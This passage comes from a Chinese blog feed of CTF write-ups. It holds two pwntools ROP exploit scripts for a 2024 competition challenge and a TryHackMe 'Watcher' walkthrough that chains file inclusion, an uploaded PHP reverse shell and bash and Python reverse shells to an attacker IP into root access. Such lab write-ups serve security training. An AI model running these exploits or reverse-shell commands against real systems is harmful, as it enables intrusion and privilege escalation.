<code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端。</p><p>寄存器的偏移查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so.6 --only  <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>ROP链就是一个正常的泄露libc基址链</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span>*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span></span><br><span class="line"><span class="function">libc</span>=<span class="built_in">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;pwn-d929761f60.challenge.xctf.org.cn&quot;</span>, 9999, ssl=True)</span></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000401393</span></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+<span class="built_in">p64</span>(rdi)+<span class="built_in">p64</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(<span class="number">0x4012F0</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(read)+<span class="built_in">p64</span>(<span class="number">0x4012EE</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">orw  = b<span class="number">&#x27;</span>/flag\x00\x00\x00<span class="number">&#x27;</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(bss)  #/flag的字符串位置，要改</span><br><span class="line">orw += <span class="built_in">p64</span>(rsi) + <span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(open_)</span><br><span class="line"></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">3</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(read)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">1</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="meta">#pr(hex(len(orw)))</span></span><br><span class="line">p.<span class="built_in">send</span>(orw)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure><h2 id="signin">signin</h2><p>日常检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3f7000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ </span><br></pre></td></tr></table></figure><p>两道题几乎一样，但是这道题多了几个绕过和伪随机数绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-ecdfbe9bc0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xun</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Input the authentication code:&#x27;</span>)</span><br><span class="line">       <span class="comment">#payload = str((elf1.rand()%100) + 1)</span></span><br><span class="line">       <span class="comment">#p.send(payload)</span></span><br><span class="line">        p.send(p64(elf1.rand()%<span class="number">100</span>+<span class="number">1</span>))</span><br><span class="line">       </span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">rdi=<span class="number">0x0000000000401893</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x00000000040177B</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rl(&quot;lets move and pwn!&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(<span class="number">0x0004013EE</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">orw  = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">orw += p64(rdi) + p64(bss)  <span class="comment">#/flag的字符串位置，要改</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(len(orw)))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(orw)))</span><br><span class="line">p.send(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">强网拟态 2024 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://ya1orin.github.io/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://ya1orin.github.io/tags/CTF/"/>
    
    <category term="Competition" scheme="https://ya1orin.github.io/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>THM-Watcher</title>
    <link href="https://ya1orin.github.io/posts/837dcb87.html"/>
    <id>https://ya1orin.github.io/posts/837dcb87.html</id>
    <published>2024-10-18T11:32:56.000Z</published>
    <updated>2024-11-13T05:19:41.575Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.76.81</p></blockquote><h1>信息收集</h1><h2 id="nmap扫描">nmap扫描</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132502836-1887610598.png" alt="image-20241021132444064"></p><p>发现开放21，22，80端口</p><h2 id="21端口">21端口</h2><p>尝试一下匿名登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132601829-412050595.png" alt="image-20241021132544221"></p><p>匿名登陆失败</p><h2 id="80端口">80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132647834-1011735877.png" alt="image-20241021132630028"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132809242-1024503247.png" alt="image-20241021132751518"></p><p>随便点击后发现在url处疑似存在文件包含，尝试利用一下</p><p><code>/post.php?post=/etc/passwd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132848048-1949569944.png" alt="image-20241021132830423"></p><p>此处确实存在文件包含</p><p>再扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.76.81/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133255264-514546742.png" alt="image-20241021133237741"></p><ul><li><code>robots.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133341367-1636037732.png" alt="image-20241021133323903"></p><p>找到俩文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133429703-900456467.png" alt="image-20241021133412280"></p><p>其中一个是flag1</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133523610-110842426.png" alt="image-20241021133506063"></p><p>另一个无法访问，但是可以用之前发现的文件包含读取文件</p><p><code>/post.php?post=secret_file_do_not_read.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133606595-1706470773.png" alt="image-20241021133549160"></p><p>发现另一重要目录<code>/home/ftpuser/ftp/files</code>，同时最后面像是一组用户名密码<code>ftpuser:givemefiles777</code>，再次尝试登录ftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp ftpuser@10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134015974-2036326351.png" alt="image-20241021133958383"></p><p>登陆成功，并找到flag2</p><p>同时files目录就是之前通过任意文件读取找到的目录</p><h1>获得初始访问权限</h1><p>我们可以尝试一下，通过ftp上传的文件，我们知道其绝对路径，就可以通过文件读取进行利用</p><p>先简单尝试一下，准备个php文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134728595-1142287777.png" alt="image-20241021134710659"></p><p>通过ftp上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134741144-1604384591.png" alt="image-20241021134723674"></p><p>此时文件的绝对路径就是<code>/home/ftpuser/ftp/files/info.php</code></p><p>再通过浏览器读取该文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134838040-1001287900.png" alt="image-20241021134820399"></p><p>成功读取，同时php代码也可以被解析，可以利用这个进行反弹shell</p><p>准备好我们的<a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">webshell</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135028115-2037447420.png" alt="image-20241021135010474"></p><p>设置好ip和port</p><p>将文件通过ftp上传到服务器上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135329563-557176968.png" alt="image-20241021135312126"></p><p>攻击机设置好监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135347617-1267050085.png" alt="image-20241021135330242"></p><p>浏览器读取并访问我们的shell文件</p><p><code>/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135440557-392731814.png" alt="image-20241021135423056"></p><p>拿到shell</p><h1>主机用户信息收集</h1><p>我们已经获得了<code>www-data</code>权限，能够简单的访问服务器资源，我们需要更进一步的控制这台服务器，就需要继续提升我们的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135929107-235560157.png" alt="image-20241021135911555"></p><p>在<code>/home/mat</code>下，找到flag5，但是权限不够无法访问，但是可以查看<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140040335-1570935829.png" alt="image-20241021140022894"></p><p>发现可以使用脚本执行，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140152087-852207533.png" alt="image-20241021140134588"></p><p>先切换到交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>发现该文件只提供了三个可以执行的命令，因为文件所属权不属于当前用户，所以无法更改，看下其他用户目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140642766-1756489674.png" alt="image-20241021140625275"></p><p>还有个<code>note.txt</code>，查看一下，<code>flag4</code>还是没权限查看，同时还注意到有个<code>jobs</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141248050-1048480932.png" alt="image-20241021141230381"></p><p>看样子是想提醒我们查看<code>jobs</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141331204-1164871302.png" alt="image-20241021141313651"></p><p>这是一个脚本文件，里面有cat命令</p><p>继续查看最后一个用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141428606-130895387.png" alt="image-20241021141411017"></p><p>这里只有flag6，仍然无权限读取</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141806989-1106969102.png" alt="image-20241021141749594"></p><p>在web目录下找到flag3</p><h1>提升至user权限</h1><h2 id="提升至toby权限">提升至toby权限</h2><p>先检查下<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144652253-1150780171.png" alt="image-20241021144634735"></p><p>发现可以使用<code>toby</code>执行任何命令<code>sudo</code>无需密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144827096-1301873310.png" alt="image-20241021144809623"></p><p>获取<code>toby</code>用户权限，并拿到flag4</p><h2 id="横移至mat权限">横移至mat权限</h2><p>结合之前的信息可知toby的<code>jobs</code>目录中<code>cow.sh</code>是mat的，而我们可以修改该文件，所以我们可以通过写反弹shell获取mat的权限</p><p>攻击机先设置监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145651665-600001604.png" alt="image-20241021145634230"></p><p>在靶机中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; cow.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145821073-1468765908.png" alt="image-20241021145803589"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150121987-290344974.png" alt="image-20241021150104300"></p><p>过一会等定时任务触发，就拿到了mat的shell，并在当前目录找到flag5</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150554982-1695743786.png" alt="image-20241021150537504"></p><h2 id="横移至will权限">横移至will权限</h2><p>现在已经拿到了mat的权限，查看一下<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151156011-979402750.png" alt="image-20241021151138536"></p><p>发现我们可以不用密码执行<code>will</code>权限的<code>python3</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151729954-690550907.png" alt="image-20241021151707919"></p><p>结合之前分析的结果可知，我们有权修改<code>cmd.py</code>，无权更改<code>will_script.py</code>，但是<code>will_script.py</code>会调用<code>cmd.py</code>，所以我们就可以通过修改<code>cmd.py</code>的内容，在其中写上反弹shell的python代码，使用<code>will</code>权限的<code>python3</code>执行<code>will_script.py</code>，我们就获得了<code>will</code>的shell</p><p>先在kali上设置监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152055316-382361973.png" alt="image-20241021152037707"></p><p>在靶机上写入python代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.14.90.122&quot;,8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt;&gt; cmd.py</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152258357-765071767.png" alt="image-20241021152240564"></p><p>执行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152345593-107476696.png" alt="image-20241021152328180"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152358318-1138667333.png" alt="image-20241021152340822"></p><p>获得will的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152454277-1738449844.png" alt="image-20241021152436836"></p><p>找到flag6</p><h1>提升至root权限</h1><p>使用will继续查找敏感文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152856987-194567056.png" alt="image-20241021152839278"></p><p>在<code>/opt/backups</code>下找到了经过<code>base64</code>编码的key</p><p>将其保存到文件<code>base64_key</code>解码查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153053351-1239828122.png" alt="image-20241021153035699"></p><p>发现是一组私钥，猜测是root的，将私钥保存到文件<code>id_rsa</code>，并赋予<code>600</code>权限便于ssh连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.10.76.81 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153454825-905657572.png" alt="image-20241021153436661"></p><p>获得root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153518635-300441644.png" alt="image-20241021153501169"></p><p>在当前目录找到最后一个flag7</p>]]></content>
    
    
    <summary type="html">TryHackMe系列之Watcher</summary>
    
    
    
    <category term="TryHackMe" scheme="https://ya1orin.github.io/categories/TryHackMe/"/>
    
    
    <category term="THM" scheme="https://ya1orin.github.io/tags/THM/"/>
    
    <category term="Linux" scheme="https://ya1orin.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>THM-dogcat</title>
    <link href="https://ya1orin.github.io/posts/652498eb.html"/>
    <id>https://ya1orin.github.io/posts/652498eb.html</id>
    <published>2024-10-18T06:52:51.000Z</published>
    <updated>2024-11-13T05:19:38.098Z</updated>
    
